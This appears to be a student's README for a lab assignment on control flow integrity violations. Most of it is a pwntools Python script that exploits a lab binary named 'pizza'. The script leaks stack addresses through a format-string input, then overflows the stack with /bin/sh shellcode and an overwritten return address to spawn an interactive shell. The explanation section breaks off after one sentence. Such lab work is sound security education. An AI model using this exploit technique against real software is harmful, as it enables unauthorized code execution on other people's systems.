# Control Flow Integrity Violation

## Summary of the assignment
Before we started this assignment we had to do some preliminary tasks to get started...

* Install pwntools.
* Download the victim program "pizza".
* Attempt to run and crash the program successfully or get the "segmentation fault".
* Open the victim program and analyze it in Ghidra.

Then we can start to write a Python transcript from the sample in order to crash the code and analyze the core dump.

## Script and Explanation

### Python Script
```python
#!/usr/bin/env python3
from pwn import *

# Stack Printing
def stackPrint(core, num = 20):
    rsp = core.rsp
    print("Stack")
    x = num // 2
    addresses = []
    # calculation and storing of the first half of the memory addresses
    for i in range(x, 0, -1):
        tmp = rsp + 8 * i
        addresses.append(tmp)

    # Print first half of the stack
    for addr in addresses:
        print(f"{addr:x}\t{core.read(addr, 8)}")

    # Print Stack Pointer
    print(f"{rsp:x}\t{core.read(rsp, 8)} <<<<< RSP")

    # Print second half of the stack
    for i in range(x - 1, 0, -1):
        tmp = rsp - 8 * i
        print(f"{tmp:x}\t{core.read(tmp, 8)}")

# Executable and Linkable Format
elf = ELF("./pizza")

context(arch='amd64', os='linux', endian='little', word_size=64)

shellcode = asm(shellcraft.amd64.linux.sh())

victim = process("./pizza")

input1 = b"%p %p %p %p %p %p %p %p %p"

print(str(victim.recvline(), "latin-1"))
victim.sendline(input1)

var = str(victim.recvline(), "latin-1")
print(var)

# Subtract offset to the start of shellcode
addr = int(var.split(" ")[7], 16) - 112

input2 = shellcode + b"T"*88 + addr.to_bytes(8, 'little')
var = str(victim.recvline(), "latin-1")
victim.sendline(b"4")

victim.sendline(input2)

# Print the stack
stackPrint(victim, num=20)

victim.interactive()

victim.wait()

exit()

```

### Explanation and Screenshots
In order to crash the victim program we had to...
